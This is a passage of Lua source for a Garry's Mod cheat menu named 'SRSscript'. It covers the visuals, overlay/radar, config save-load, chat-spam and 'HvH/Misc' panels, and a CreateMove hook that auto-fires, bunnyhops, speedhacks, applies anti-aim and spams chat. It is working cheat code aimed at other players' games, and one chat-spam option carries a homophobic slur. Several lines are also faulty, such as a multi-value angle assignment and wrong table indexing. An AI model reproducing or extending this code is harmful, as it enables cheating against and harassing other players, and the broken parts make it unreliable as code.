                                SetTextPos( 42 - GetTextSize( 'W: weapon_crowbar' ), 36 )
                                DrawText( 'W: weapon_crowbar' )
                        elseif SRSscript.BOXMODE == 2 then
                                SetDrawColor( color_black )
                                DrawRect( 138, 0, 4, 200 )
                               
                                SetDrawColor( color_blue )
                                DrawRect( 139, 17.84, 2, 182.16 )
                               
                                SetDrawColor( color_black )
                                DrawRect( 142, 0, 4, 200 )
                               
                                SetDrawColor( color_blue )
                                DrawRect( 143, 132.64, 2, 67.32 )
                               
                                SetFont( 'DermaDefault' )
                                SetTextColor( color_green )
                                SetTextPos( 150, 0 )
                                DrawText( 'John' )
                               
                                SetTextColor( color_yellow )
                                SetTextPos( 150, 12 )
                                DrawText( 'H: 92' )
                               
                                SetTextPos( 150, 24 )
                                DrawText( 'A: 34' )
                               
                                SetTextPos( 150, 36 )
                                DrawText( 'W: weapon_crowbar' )
                        end
                end
               
        local esp2dp = vgui_Create( 'DComboBox', panel )
                esp2dp:SetPos( 156, 305 )
                esp2dp:SetWide( 192 )
                esp2dp:AddChoice( 'Left' )
                esp2dp:AddChoice( 'Bottom' )
                esp2dp:AddChoice( 'Right' )
                esp2dp.Color = color_black
                esp2dp.OnCursorEntered = function( self )
                        self.Color = color_green
                end
               
                esp2dp.OnCursorExited = function( self )
                        self.Color = color_black
                end
               
                esp2dp:ChooseOptionID( SRSscript.BOXMODE + 1 )
                esp2dp.OnSelect = function( self, index )
                        SRSscript.BOXMODE = index - 1
                end
               
                esp2dp.Paint = function( self )
                        SetDrawColor( self.Color )
                        DrawOutlinedRect( 0, 0, self:GetSize() )
                end
               
                esp2dp.PaintOver = function( self )
                        SetFont( 'DermaDefault' )
                        SetTextColor( color_white )
                        SetTextPos( 8, 4 )
                        DrawText( esp2dp:GetValue() )
                end
end
 
local function SRSscript__HUD( panel )
        panel.Paint = nil
        panel:SetSize( 360, 335 )
       
        local y = 11
        local ch = vgui_Create( 'DCheckBoxLabel', panel )
                ch:SetPos( 5, y )
                ch:SetText( 'Draw radar' )
                ch:SizeToContents()
                ch.Think = function()
                        ch:SetValue( SRSscript.RADAR )
                end
               
                ch.OnChange = function( self )
                        SRSscript.RADAR = self:GetChecked()
                       
                        if not SRSscript.RADAR then
                                SRSscript.RADAR_NICK = false
                        end
                end
               
                y = y + 17.5
        local ch = vgui_Create( 'DCheckBoxLabel', panel )
                ch:SetPos( 5, y )
                ch:SetText( 'Radar: Include players' )
                ch:SizeToContents()
                ch.Think = function()
                        ch:SetValue( SRSscript.RADINCLUDEPLAYERS )
                end
               
                ch.OnChange = function( self )
                        SRSscript.RADINCLUDEPLAYERS = self:GetChecked()
                end
               
                y = y + 17.5
        local ch = vgui_Create( 'DCheckBoxLabel', panel )
                ch:SetPos( 5, y )
                ch:SetText( 'Radar: Include NPCs' )
                ch:SizeToContents()
                ch.Think = function()
                        ch:SetValue( SRSscript.RADINCLUDENPCS )
                end
               
                ch.OnChange = function( self )
                        SRSscript.RADINCLUDENPCS = self:GetChecked()
                end
               
                y = y + 17.5
        local ch = vgui_Create( 'DCheckBoxLabel', panel )
                ch:SetPos( 5, y )
                ch:SetText( 'Draw nick and classname on radar' )
                ch:SizeToContents()
                ch.Think = function()
                        ch:SetValue( SRSscript.RADAR_NICK )
                end
               
                ch.OnChange = function( self )
                        SRSscript.RADAR_NICK = self:GetChecked()
                       
                        if SRSscript.RADAR_NICK then
                                SRSscript.RADAR = true
                        end
                end
               
                y = y + 17.5
        local ch = vgui_Create( 'DCheckBoxLabel', panel )
                ch:SetPos( 5, y )
                ch:SetText( 'Draw spectators list' )
                ch:SizeToContents()
                ch.Think = function()
                        ch:SetValue( SRSscript.SPECLIST )
                end
               
                ch.OnChange = function( self )
                        SRSscript.SPECLIST = self:GetChecked()
                       
                        if SRSscript.SPECLIST then
                                SRSscript.DETECTSPEC = true
                        end
                end
               
        local label = vgui_Create( 'DLabel', panel )
                label:SetPos( 225, 2 )
                label:SetText( 'Custom crosshair settings' )
                label:SizeToContents()
               
        local rgb = vgui_Create( 'DLabel', panel )
                rgb:SetPos( 221, 20 )
                rgb:SetText( 'R: 255\nG: 255\nB: 255' )
                rgb:SizeToContents()
                rgb.Think = function()
                        rgb:SetText( format( 'R: %i\nG: %i\nB: %i', SRSscript.CROSSCOLOR.r, SRSscript.CROSSCOLOR.g, SRSscript.CROSSCOLOR.b ) )
                end
               
        local crmode = vgui_Create( 'DComboBox', panel )
                crmode:SetPos( 220, 120 )
                crmode:SetWide( 128 )
                crmode:AddChoice( 'Off' )
                crmode:AddChoice( 'Dot' )
                crmode:AddChoice( 'Cross' )
                crmode:AddChoice( 'Cross in a box' )
                crmode:AddChoice( 'Cross in a circle' )
                crmode:ChooseOptionID( SRSscript.CROSSMODE + 1 )
                crmode.Color = color_black
                crmode.OnCursorEntered = function( self )
                        self.Color = color_green
                end
               
                crmode.OnCursorExited = function( self )
                        self.Color = color_black
                end
               
                crmode.OnSelect = function( self, index )
                        SRSscript.CROSSMODE = index - 1
                end
               
                crmode.Paint = function( self )
                        SetDrawColor( self.Color )
                        DrawOutlinedRect( 0, 0, self:GetSize() )
                end
               
                crmode.PaintOver = function( self )
                        SetFont( 'DermaDefault' )
                        SetTextColor( color_white )
                        SetTextPos( 8, 4 )
                        DrawText( crmode:GetValue() )
                end
               
        local ind = vgui_Create( 'DPanel', panel )
                ind:SetPos( 310, 20 )
                ind:SetSize( 40, 40 )
                ind.Paint = function()
                        SetDrawColor( SRSscript.CROSSCOLOR )
                       
                        if SRSscript.CROSSMODE == 1 then
                                DrawRect( 19, 19, 2, 2 )
                               
                                DrawRect( 17, 19, 2, 2 )
                                DrawRect( 21, 19, 2, 2 )
                               
                                DrawRect( 19, 17, 2, 2 )
                                DrawRect( 19, 21, 2, 2 )
                               
                                DrawRect( 18, 18, 2, 2 )
                                DrawRect( 18, 20, 2, 2 )
                                DrawRect( 20, 18, 2, 2 )
                                DrawRect( 20, 20, 2, 2 )
                        end
                       
                        if SRSscript.CROSSMODE == 2 then
                                DrawLine( 5, 20, 35, 20 )
                                DrawLine( 20, 5, 20, 35 )
                        end
                       
                        if SRSscript.CROSSMODE == 3 then
                                DrawLine( 5, 20, 35, 20 )
                                DrawLine( 20, 5, 20, 35 )
                                DrawOutlinedRect( 0, 0, 40, 40 )
                        end
                       
                        if SRSscript.CROSSMODE == 4 then
                                DrawLine( 5, 20, 35, 20 )
                                DrawLine( 20, 5, 20, 35 )
                                DrawCircle( 20, 20, 20, SRSscript.CROSSCOLOR )
                        end
                end
               
        local r = vgui_Create( 'DSlider', panel )
                r:SetPos( 220, 60 )
                r:SetWide( 128 )
                r:SetSlideX( SRSscript.CROSSCOLOR.r / 255 )
                r.Paint = function()
                        SetDrawColor( color_black )
                        DrawRect( 0, 9, 128, 3 )
                end
               
                r.Think = function()
                        SRSscript.CROSSCOLOR.r = r:GetSlideX() * 255
                end
               
        local g = vgui_Create( 'DSlider', panel )
                g:SetPos( 220, 80 )
                g:SetWide( 128 )
                g:SetSlideX( SRSscript.CROSSCOLOR.g / 255 )
                g.Paint = function()
                        SetDrawColor( color_black )
                        DrawRect( 0, 9, 128, 3 )
                end
               
                g.Think = function()
                        SRSscript.CROSSCOLOR.g = g:GetSlideX() * 255
                end
               
        local b = vgui_Create( 'DSlider', panel )
                b:SetPos( 220, 100 )
                b:SetWide( 128 )
                b:SetSlideX( SRSscript.CROSSCOLOR.b / 255 )
                b.Paint = function()
                        SetDrawColor( color_black )
                        DrawRect( 0, 9, 128, 3 )
                end
               
                b.Think = function()
                        SRSscript.CROSSCOLOR.b = b:GetSlideX() * 255
                end
               
        local label = vgui_Create( 'DLabel', panel )
                label:SetPos( 220, 150 )
                label.Think = function( self )
                        self:SetText( 'Radar radius: ' .. SRSscript.RADAR_SCALE .. 'u' )
                        self:SizeToContents()
                end
               
        local rad = vgui_Create( 'DSlider', panel )
                rad:SetPos( 220, 160 )
                rad:SetWide( 128 )
                rad:SetSlideX( ( SRSscript.RADAR_SCALE - 128 ) / 16256 )
                rad.Paint = function()
                        SetDrawColor( color_black )
                        DrawRect( 0, 9, 128, 3 )
                end
               
                rad.Think = function()
                        SRSscript.RADAR_SCALE = rad:GetSlideX() * 16256 + 128
                end
               
        local label = vgui_Create( 'DLabel', panel )
                label:SetPos( 220, 180 )
                label.Think = function( self )
                        self:SetText( 'Radar size: ' .. SRSscript.RADAR_SIZE * 2 .. 'px' )
                        self:SizeToContents()
                end
               
        local sz = vgui_Create( 'DSlider', panel )
                sz:SetPos( 220, 190 )
                sz:SetWide( 128 )
                sz:SetSlideX( ( SRSscript.RADAR_SIZE - 64 ) / 192 )
                sz.Paint = function()
                        SetDrawColor( color_black )
                        DrawRect( 0, 9, 128, 3 )
                end
               
                sz.Think = function()
                        SRSscript.RADAR_SIZE = sz:GetSlideX() * 192 + 64
                end
end
 
local fsStatus
local function SRSscript__CONF( panel )
        panel.Paint = nil
        panel:SetSize( 360, 335 )
       
        local status = vgui_Create( 'DLabel', panel )
                status:SetPos( 5, 59 )
                status.SetValue = function( self, str )
                        self:SetText( str )
                        self:SizeToContents()
                end
               
                status:SetValue( fsStatus or ' ' )
                fsStatus = nil
       
        local save = vgui_Create( 'DComboBox', panel )
                save:SetPos( 5, 6 )
                save:SetWide( 128 )
                save.Color = color_black
               
                for _, f in pairs( Dir( 'SRSscript/*', 'DATA' ) or {} ) do
                        save:AddChoice( gsub( f, '.txt', '' ) )
                end
               
                save:SetText( SRSscript.FSTR )
                save.OnCursorEntered = function( self )
                        self.Color = color_green
                end
               
                save.OnCursorExited = function( self )
                        self.Color = color_black
                end
               
                save.OnSelect = function( self )
                        SRSscript.FSTR = self:GetValue()
                end
               
                save.Paint = function( self )                  
                        SetDrawColor( self.Color )
                        DrawOutlinedRect( 0, 0, self:GetSize() )
                end
               
                save.PaintOver = function( self )
                        SetFont( 'DermaDefault' )
                        SetTextColor( color_white )
                        SetTextPos( 8, 4 )
                        DrawText( save:GetValue() )
                end
               
                save.Think = function( self )
                        self:SetValue( SRSscript.FSTR )
                end
               
        local savet = vgui_Create( 'DTextEntry', panel )
                savet:SetPos( 5, 7 )
                savet:SetWide( 104 )
                savet:SetText( SRSscript.FSTR )
                savet.Paint = nil
                savet.OnCursorEntered = function( self )
                        save.Color = color_green
                end
               
                savet.OnCursorExited = function( self )
                        save.Color = color_black
                end
               
                savet.OnChange = function( self )
                        save:SetText( self:GetValue() )
                        SRSscript.FSTR = self:GetValue()
                end
               
                savet.Think = function( self )
                        self:SetValue( SRSscript.FSTR )
                end
               
        local saveb = vgui_Create( 'DButton', panel )
                saveb:SetPos( 5, 33 )
                saveb:SetSize( 61.5, save:GetTall() )
                saveb:SetText( 'Save' )
                saveb.Color = color_black
               
                saveb.OnCursorEntered = function( self )
                        self.Color = color_green
                end
               
                saveb.OnCursorExited = function( self )
                        self.Color = color_black
                end
               
                saveb.Paint = function( self )                 
                        SetDrawColor( self.Color )
                        DrawOutlinedRect( 0, 0, self:GetSize() )
                end
               
                saveb.PaintOver = function( self )
                        SetFont( 'DermaDefault' )
                        SetTextColor( color_white )
                        SetTextPos( 18, 4 )
                        DrawText( saveb:GetValue() )
                end
               
                saveb.DoClick = function()
                        if not IsDir( 'SRSscript', 'DATA' ) then
                                MkDir( 'SRSscript' )
                        end
                       
                        if IsDir( 'SRSscript', 'DATA' ) then
                                Write( 'SRSscript/' .. SRSscript.FSTR .. '.txt', TableToJSON( SRSscript ) )
                               
                                if Exists( 'SRSscript/' .. SRSscript.FSTR .. '.txt', 'DATA' ) then
                                        status:SetValue( 'Config was successfuly saved as "' .. SRSscript.FSTR .. '.txt"!' )
                                else
                                        status:SetValue( 'Unknown saving error!' )
                                end
                        else
                                status:SetValue( 'Saving error! Could not create a dir!' )
                        end
                end
               
        local loadb = vgui_Create( 'DButton', panel )
                loadb:SetPos( 71.5, 33 )
                loadb:SetSize( 61.5, saveb:GetTall() )
                loadb:SetText( 'Load' )
                loadb.Color = color_black
               
                loadb.OnCursorEntered = function( self )
                        self.Color = color_green
                end
               
                loadb.OnCursorExited = function( self )
                        self.Color = color_black
                end
               
                loadb.Paint = function( self )
                        SetDrawColor( self.Color )
                        DrawOutlinedRect( 0, 0, self:GetSize() )
                end
               
                loadb.PaintOver = function( self )
                        SetFont( 'DermaDefault' )
                        SetTextColor( color_white )
                        SetTextPos( 19, 4 )
                        DrawText( loadb:GetValue() )
                end
               
                loadb.DoClick = function()
                        if Exists( 'SRSscript/' .. SRSscript.FSTR .. '.txt', 'DATA' ) then
                                local tbl = JSONToTable( Read( 'SRSscript/' .. SRSscript.FSTR .. '.txt', 'DATA' ) )
                               
                                if tbl then
                                        local outdated = false
                                        for k in pairs( SRSscript ) do
                                                if type( tbl[ k ] ) ~= type( SRSscript[ k ] ) then
                                                        outdated = true
                                                        break
                                                end
                                        end
                                       
                                        if outdated then
                                                status:SetValue( 'File might be damaged, failed to load.' )
                                        else
                                                SRSscript = tbl
                                                fsStatus = 'Settings has been loaded from "' .. SRSscript.FSTR .. '.txt"!'
                                               
                                                local Hold = SRSscript_menu.Hold
                                                SRSscript_menu:Remove()
                                                SRSscript_menu = nil
                                               
                                                SRSscript_OPENMENU()
                                                SRSscript_menu.Hold = Hold
                                        end
                                else
                                        status:SetValue( 'File might be damaged, failed to load.' )
                                end
                        else
                                status:SetValue( 'File does not exist, failed to load.' )
                        end
                end
end
 
local function SRSscript__CSPAM( panel )
        panel.Paint = nil
        panel:SetSize( 360, 335 )
        local y = 11
               
                local ch = vgui_Create( 'DCheckBoxLabel', panel )
                ch:SetPos( 5, y )
                ch:SetText( 'w8 wot' )
                ch:SizeToContents()
                ch.Think = function()
                        ch:SetValue( SRSscript.CHATSPAM1 )
                end
               
                ch.OnChange = function( self )
                        SRSscript.CHATSPAM1 = self:GetChecked()
                end
               
                y = y + 17.5
                local ch = vgui_Create( 'DCheckBoxLabel', panel )
                ch:SetPos( 5, y )
                ch:SetText( 'faggot' )
                ch:SizeToContents()
                ch.Think = function()
                        ch:SetValue( SRSscript.CHATSPAM2 )
                end
               
                ch.OnChange = function( self )
                        SRSscript.CHATSPAM2 = self:GetChecked()
                end
               
                y = y + 17.5
                local ch = vgui_Create( 'DCheckBoxLabel', panel )
                ch:SetPos( 5, y )
                ch:SetText( 'hisss' )
                ch:SizeToContents()
                ch.Think = function()
                        ch:SetValue( SRSscript.CHATSPAM3 )
                end
               
                ch.OnChange = function( self )
                        SRSscript.CHATSPAM3 = self:GetChecked()
                end
               
                y = y + 17.5
                local ch = vgui_Create( 'DCheckBoxLabel', panel )
                ch:SetPos( 5, y )
                ch:SetText( '????' )
                ch:SizeToContents()
                ch.Think = function()
                        ch:SetValue( SRSscript.CHATSPAM4 )
                end
               
                ch.OnChange = function( self )
                        SRSscript.CHATSPAM4 = self:GetChecked()
                end
               
                y = y + 17.5
                local ch = vgui_Create( 'DCheckBoxLabel', panel )
                ch:SetPos( 5, y )
                ch:SetText( 'douche' )
                ch:SizeToContents()
                ch.Think = function()
                        ch:SetValue( SRSscript.CHATSPAM5 )
                end
               
                ch.OnChange = function( self )
                        SRSscript.CHATSPAM5 = self:GetChecked()
                end
               
end
 
local function SRSscript__MISC( panel )
        panel.Paint = nil
        panel:SetSize( 360, 335 )
       
        local y = 11
        local ch = vgui_Create( 'DCheckBoxLabel', panel )
                ch:SetPos( 5, y )
                ch:SetText( 'SV_Cheats' )
                ch:SizeToContents()
                ch.Think = function()
                        ch:SetValue( SRSscript.SVCHEATS )
                end
               
                ch.OnChange = function( self )
                        SRSscript.SVCHEATS = self:GetChecked()
                       
                        if not SRSscript.SVCHEATS then
                                SRSscript.SPEEDHACK = 1
                        end
                end
               
                y = y + 17.5
        local ch = vgui_Create( 'DCheckBoxLabel', panel )
                ch:SetPos( 5, y )
                ch:SetText( 'Bunnyhop' )
                ch:SizeToContents()
                ch.Think = function()
                        ch:SetValue( SRSscript.BUNNYHOP )
                end
               
                ch.OnChange = function( self )
                        SRSscript.BUNNYHOP = self:GetChecked()
                end
               
                y = y + 17.5
        local ch = vgui_Create( 'DCheckBoxLabel', panel )
                ch:SetPos( 5, y )
                ch:SetText( 'Namechanger' )
                ch:SizeToContents()
                ch.Think = function()
                        ch:SetValue( SRSscript.NAMESTEALER )
                end
               
                ch.OnChange = function( self )
                        SRSscript.NAMESTEALER = self:GetChecked()
                end
               
                y = y + 17.5
        local ch = vgui_Create( 'DCheckBoxLabel', panel )
                ch:SetPos( 5, y )
                ch:SetText( 'Spectator Detection' )
                ch:SizeToContents()
                ch.Think = function()
                        ch:SetValue( SRSscript.DETECTSPEC )
                end
               
                ch.OnChange = function( self )
                        SRSscript.DETECTSPEC = self:GetChecked()
                       
                        if not SRSscript.DETECTSPEC then
                                SRSscript.SPECLIST = false
                        end
                end
               
                y = y + 17.5
        local ch = vgui_Create( 'DCheckBoxLabel', panel )
                ch:SetPos( 5, y )
                ch:SetText( 'Traitor Detection' )
                ch:SizeToContents()
                ch.Think = function()
                        ch:SetValue( SRSscript.DETECTRAITOR )
                end
               
                ch.OnChange = function( self )
                        SRSscript.DETECTRAITOR = self:GetChecked()
                end
               
                y = y + 17.5
        local ch = vgui_Create( 'DCheckBoxLabel', panel )
                ch:SetPos( 5, y )
                ch:SetText( 'Third Person' )
                ch:SizeToContents()
                ch.Think = function()
                        ch:SetValue( SRSscript.THIRDPERSON )
                end
               
                ch.OnChange = function( self )
                        SRSscript.THIRDPERSON = self:GetChecked()
                end
               
                y = y + 17.5
        local ch = vgui_Create( 'DCheckBoxLabel', panel )
                ch:SetPos( 5, y )
                ch:SetText( 'Anti-Antiaim' )
                ch:SizeToContents()
                ch.Think = function()
                        ch:SetValue( SRSscript.ANTIAIMPROXY )
                end
               
                local ch = vgui_Create( 'DCheckBoxLabel', panel )
                ch:SetPos( 5, y )
                ch:SetText( 'Anti-Antiaim' )
                ch:SizeToContents()
                ch.Think = function()
                        ch:SetValue( SRSscript.ANTIAIMPROXY )
                end
               
                ch.OnChange = function( self )
                        SRSscript.ANTIAIMPROXY = self:GetChecked()
                end
       
        local label = vgui_Create( 'DLabel', panel )
                label:SetPos( 220, 2 )
                label.Think = function( self )
                        self:SetText( 'Antiaim Options' )
                        self:SizeToContents()
                end
               
        local aa = vgui_Create( 'DComboBox', panel )
                aa:SetPos( 220, 18 )
                aa:SetWide( 128 )
                aa:AddChoice( 'Off' )
                aa:AddChoice( 'Static' )
                aa:AddChoice( 'Dynamic Static' )
                aa:ChooseOptionID( SRSscript.ANTIAIM + 1 )
                aa.Color = color_black
                aa.OnCursorEntered = function( self )
                        self.Color = color_green
                end
               
                aa.OnCursorExited = function( self )
                        self.Color = color_black
                end
               
                aa.OnSelect = function( self, index )
                        SRSscript.ANTIAIM = index - 1
                end
               
                aa.Paint = function( self )                    
                        SetDrawColor( self.Color )
                        DrawOutlinedRect( 0, 0, self:GetSize() )
                end
               
                aa.PaintOver = function( self )
                        SetFont( 'DermaDefault' )
                        SetTextColor( color_white )
                        SetTextPos( 8, 4 )
                        DrawText( aa:GetValue() )
                end
        local spd = vgui_Create( 'DSlider', panel )
                spd:SetPos( 220, 55 )
                spd:SetWide( 0 )
                spd:SetSlideX( ( SRSscript.SPEEDHACK - 1 ) / 9 )
                spd.Paint = function()
                        SetDrawColor( color_black )
                        DrawRect( 0, 9, 128, 3 )
                end
               
                spd.Think = function()
                        SRSscript.SPEEDHACK = round( spd:GetSlideX() * 9 + 1 )
                       
                        if SRSscript.SPEEDHACK > 1 then
                                SRSscript.SVCHEATS = true
                        end
                end
               
                local ch = vgui_Create( 'DCheckBoxLabel', panel )
                ch:SetPos( 5, y + 17.5)
                ch:SetText( 'Flashlight Spam' )
                ch:SizeToContents()
                ch.Think = function()
                        ch:SetValue( SRSscript.FLASHSPAM )
                end
               
                ch.OnChange = function( self )
                        SRSscript.FLASHSPAM = self:GetChecked()
                end
end
 
function SRSscript_OPENMENU()
        if SRSscript_menu then
                SRSscript_menu.Hold = ( SRSscript_menu.Hold or 0 ) + 1
                return
        end
       
        SRSscript_menu = vgui_Create( 'DFrame' )
        SRSscript_menu:SetPos( SRSscript.MENU_POS[1], SRSscript.MENU_POS[2] )
        SRSscript_menu:SetSize( 480, 360 )
        SRSscript_menu:MakePopup()
        SRSscript_menu:SetTitle( '' .. Random( title ) )
        SRSscript_menu:ShowCloseButton( false )
        SRSscript_menu.Close = function()
                SRSscript.MENU_POS = { SRSscript_menu:GetPos() }
               
                SRSscript_menu:Remove()
                SRSscript_menu = nil
        end
       
        SRSscript_menu.Paint = function( self )
                local x, y = self:GetPos()
                local w, h = self:GetSize()
                self:SetPos( Clamp( x, 0, ScrW() - 480 ), Clamp( y, 0, ScrH() - 360 ) )
        end
       
        local cs = vgui_Create( 'DColumnSheet', SRSscript_menu )
                cs:SetPos( 5, 25 )
                cs:SetSize( 480, 335 ) 
       
        local abot = vgui_Create( 'DPanel', SRSscript_menu )
                SRSscript__ABOT( abot )
       
        cs:AddSheet( 'Aimbot', abot )
       
        local esp = vgui_Create( 'DPanel', SRSscript_menu )
                SRSscript__ESP( esp )
       
        cs:AddSheet( 'Visuals', esp )
       
        local hud = vgui_Create( 'DPanel', SRSscript_menu )
                SRSscript__HUD( hud )
       
        cs:AddSheet( 'Overlay', hud )
       
        local conf = vgui_Create( 'DPanel', SRSscript_menu )
                SRSscript__CONF( conf )
       
        cs:AddSheet( 'Configuration', conf )
       
        local misc = vgui_Create( 'DPanel', SRSscript_menu )
                SRSscript__MISC( misc )
       
        cs:AddSheet( 'HvH/Misc', misc )
       
        local cspam = vgui_Create( 'DPanel', SRSscript_menu )
                SRSscript__CSPAM( cspam )
       
        cs:AddSheet( 'Chat Spam', cspam )
        cs.Items[ SRSscript_item ].Button:DoClick()
       
        for i = 1, #cs.Items do
                local item = cs.Items[ i ]
                item.Button.Color = color_black
                item.Button.Paint = function( self )
                        local w, h = self:GetSize()
                        SetDrawColor( SRSscript_item == i and color_green or self.Color )
                        DrawOutlinedRect( 0, 0, w, h )
                       
                        if SRSscript_item == i then
                                DrawOutlinedRect( 1, 1, w - 2, h - 2 )
                        end
                end
               
                item.Button.PaintOver = function( self )
                        SetFont( 'DermaDefault' )
                        SetTextColor( color_white )
                        SetTextPos( self:GetWide() / 2 - GetTextSize( self:GetValue() ) / 2, 4 )
                        DrawText( self:GetValue() )
                end
               
                item.Button.OnCursorEntered = function( self )
                        self.Color = color_green
                end
               
                item.Button.OnCursorExited = function( self )
                        self.Color = color_black
                end
               
                local clk = item.Button.DoClick
                item.Button.DoClick = function( self )
                        clk( self )
                        SRSscript_item = i
                end
               
                item.Button:DockMargin( 0, 3, 6, 0 )
        end
end
 
 
local function SRSscript_GUI()
        local x, y = MousePos()
        if IsMouseDown( MOUSE_LEFT ) then
                local w, h = ScrW(), ScrH()
                local vpw, vph = w / 4, h / 4
                if SRSscript_drone_grab then
                        SRSscript.DRONE_POS[1] = Clamp( x - SRSscript_gx, 0, w - vpw )
                        SRSscript.DRONE_POS[2] = Clamp( y - SRSscript_gy, 0, h - vph )
                       
                        return
                end
               
                if SRSscript_radar_grab then
                        SRSscript.RADAR_POS[1] = Clamp( x - SRSscript_dx, SRSscript.RADAR_SIZE, w - SRSscript.RADAR_SIZE )
                        SRSscript.RADAR_POS[2] = Clamp( y - SRSscript_dy, SRSscript.RADAR_SIZE, h - SRSscript.RADAR_SIZE )
                       
                        return
                end
               
                local hg = 40 + #SRSscript_spectators * 16
                if SRSscript_spec_grab then
                        SRSscript.SPEC_POS[1] = Clamp( x - SRSscript_sx, 128, w - 128 )
                        SRSscript.SPEC_POS[2] = Clamp( y - SRSscript_sy, 0, h - hg )
                       
                        return
                end
       
                if SRSscript.RADAR and not SRSscript_radar_grab and not SRSscript_spec_grab and not SRSscript_drone_grab and ( SRSscript.RADAR_POS[1] - SRSscript.RADAR_SIZE ) < x and ( SRSscript.RADAR_POS[1] + SRSscript.RADAR_SIZE ) > x and ( SRSscript.RADAR_POS[2] - SRSscript.RADAR_SIZE ) < y and ( SRSscript.RADAR_POS[2] + SRSscript.RADAR_SIZE ) > y then
                        SRSscript_dx = x - SRSscript.RADAR_POS[1]
                        SRSscript_dy = y - SRSscript.RADAR_POS[2]
                       
                        SRSscript_radar_grab = true
                end
               
                if SRSscript.SPECLIST and not SRSscript_radar_grab and not SRSscript_spec_grab and not SRSscript_drone_grab and ( SRSscript.SPEC_POS[1] - 128 ) < x and ( SRSscript.SPEC_POS[1] + 128 ) > x and ( SRSscript.SPEC_POS[2] ) < y and ( SRSscript.SPEC_POS[2] + hg ) > y then
                        SRSscript_sx = x - SRSscript.SPEC_POS[1]
                        SRSscript_sy = y - SRSscript.SPEC_POS[2]
                       
                        SRSscript_spec_grab = true
                end
        else
                SRSscript_drone_grab = false
                SRSscript_radar_grab = false
                SRSscript_spec_grab = false
        end
end
 
local nextfire = 0
local aa_yaw = 0
local attack
 
SRSscript_REGISTERHOOK( 'CreateMove', function( cmd )
        local tr = SRSscript_BUILDTRACE()
       
        SRSscript_p = NormalizeAngle( Clamp( SRSscript_p + cmd:GetMouseY() * 0.022, -89, 89 ) )
        SRSscript_y = NormalizeAngle( SRSscript_y - cmd:GetMouseX() * 0.022 )
       
        if SRSscript.BUNNYHOP and band( cmd:GetButtons(), IN_JUMP ) ~= 0 then
                if not SRSscript_self:IsOnGround() then
                        cmd:SetButtons( band( cmd:GetButtons(), bnot( IN_JUMP ) ) )
                end
        end
       
        local w = SRSscript_self:GetActiveWeapon()
        local valid = IsValid( w )
        if SRSscript.AUTORELOAD and valid and w:Clip1() == 0 then
                cmd:SetButtons( bor( cmd:GetButtons(), IN_RELOAD ) )
        end
       
        local crowbar = true
        if SRSscript.CROWBAR and valid and ( w:GetClass() == 'weapon_crowbar' or w:GetClass() == 'weapon_ttt_knife' or w:GetClass() == 'weapon_ttt_axe' ) then
                crowbar = tr.HitPos:Distance( SRSscript_self:GetShootPos() ) < 75
        end
       
        if valid and crowbar and ( ( SRSscript_aimbot and SRSscript.AUTOSHOT and SRSscript_target ) or SRSscript.TRIGGER and IsValid( tr.Entity ) and SRSscript_CANTARGET( tr.Entity ) ) then
                if SRSscript_keydown then
                        cmd:SetButtons( bor( cmd:GetButtons(), IN_ATTACK ) )
                        SRSscript_keydown = false
                else
                        cmd:SetButtons( band( cmd:GetButtons(), IN_ATTACK ) )
                        SRSscript_keydown = true
                end
        end
       
        if SRSscript.AUTOPISTOL then
                if band( cmd:GetButtons(), IN_ATTACK ) ~= 0 and valid and ( w.Primary and not w.Primary.Automatic or w:GetClass() == 'weapon_pistol' ) and w:Clip1() > 0 then
                        if SRSscript_down_l then
                                cmd:SetButtons( bor( cmd:GetButtons(), IN_ATTACK ) )
                                SRSscript_down_l = false
                        else
                                cmd:SetButtons( band( cmd:GetButtons(), bnot( IN_ATTACK ) ) )
                                SRSscript_down_l = true
                        end
                end
        end
       
        attack = band( cmd:GetButtons(), IN_ATTACK ) ~= 0
       
        if SRSscript.FLASHSPAM then
                RunConsoleCommand("impulse","100")
        end
       
local chattable = {
"ayy lmao",
"SRSowned",
"ur a kid now",
"ur a squid now",
}
 
local chattable2 = {
"I can code C++ master hacks in lua, get rekt scrub",
"dun fuk with teh ddos gang yo",
"( ͡° ͜🔴 ͡°( ͡° ͜🔴 ͡°)﻿ ͡° ͜🔴 ͡°)﻿",
}
 
local chattable3 = {
"hisssssssssss",
"hisssssssssssssssssssssssssssss",
"hisssssss",
}
 
local chattable4 = {
".__o< quack quack",
".__o< quack quack",
".__o< quack quack",
}
 
local chattable5 = {
"SRSrekt",
"SRSrekt",
"SRSrekt",
"SRSrekt",
"SRSrekt",
"SRSrekt",
}
       
        if SRSscript.CHATSPAM1 then
                RunConsoleCommand("say", chattable[math.random(#chattable)])
        end
       
        if SRSscript.CHATSPAM2 then
                RunConsoleCommand("say", chattable2[math.random(#chattable)])
        end
       
        if SRSscript.CHATSPAM3 then
                RunConsoleCommand("say", chattable3[math.random(#chattable)])
        end
       
        if SRSscript.CHATSPAM4 then
                RunConsoleCommand("say", chattable4[math.random(#chattable)])
        end
       
        if SRSscript.CHATSPAM5 then
                RunConsoleCommand("say", chattable5[math.random(#chattable)])
        end
       
        local blockaim
        if SRSscript.ANTIAIM ~= 0 then
                local ct = CurTime()
                if nextfire < ct then
                        attack = false
                        blockaim = true
                end
               
                if nextfire < ct then
                        nextfire = ct + ( w.Primary and w.Primary.Delay and ( w.Primary.Delay - 0.001 ) or 0.001 )
                end
               
                if not attack then
                        local ang = cmd:GetViewAngles()
                       
                        aa_yaw = NormalizeAngle( aa_yaw - 270 )
                       
                        ang.p = 181, -181, 555, -555
                        ang.y = SRSscript.ANTIAIM == 1 and SRSscript_y - 181 or aa_yaw
                        ang.r = SRSscript.ANTIAIM == 1 and -181 or ( ang.r == -550 and 181 or -181 )
                       
                        cmd:SetForwardMove( -cmd:GetForwardMove() )
                        cmd:SetSideMove( -cmd:GetSideMove() )
                        cmd:SetViewAngles( ang )
                else
                        cmd:SetViewAngles( Angle( SRSscript_p, SRSscript_y, 0 ) )
                end
        else
                local ang = cmd:GetViewAngles()
               
                if SRSscript.FAKEVIEW then
                        if not SRSscript_aimbot and not IsValid( SRSscript_target ) then
                                SRSscript_p = ang.p
                                SRSscript_y = ang.y
                        else
                                ang.p = SRSscript_p
                                ang.y = SRSscript_y
                        end
                else
                        SRSscript_p = ang.p
                        SRSscript_y = ang.y
                end
               
                ang.r = 0
               
                cmd:SetViewAngles( ang )
        end
       
